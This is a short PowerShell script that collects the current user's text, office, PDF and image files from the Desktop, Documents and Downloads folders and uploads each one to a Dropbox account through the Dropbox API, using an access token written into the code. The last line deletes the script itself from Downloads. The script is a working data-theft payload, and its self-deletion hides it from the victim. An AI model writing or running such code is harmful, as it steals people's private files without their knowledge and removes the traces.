function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$DropBoxAccessToken = "sl.BP5ZD23AlTUl6CGhau_TLWIRyeIZpUW3cCkqkJ2nrQor_YA2_p-dujWFVeKFg3SD5yHvbs-1vP0wGqv_dVyem6sXdmkn5qDnetVbeo5VoyaqVS_iqbGgsCO3CCmQhCodOfmPcYYR"   # Replace with your DropBox Access Token
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}


$src =  "C:\Users\$env:username\desktop","C:\Users\$env:username\Documents","C:\Users\$env:username\Downloads"
#copy files to one folder
foreach($files in Get-ChildItem -path $src -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg -Recurse | %{$_.FullName}){    
    
    $files | DropBox-Upload
    
}
Remove-Item -path C:\Users\$env:username\downloads\test.ps1
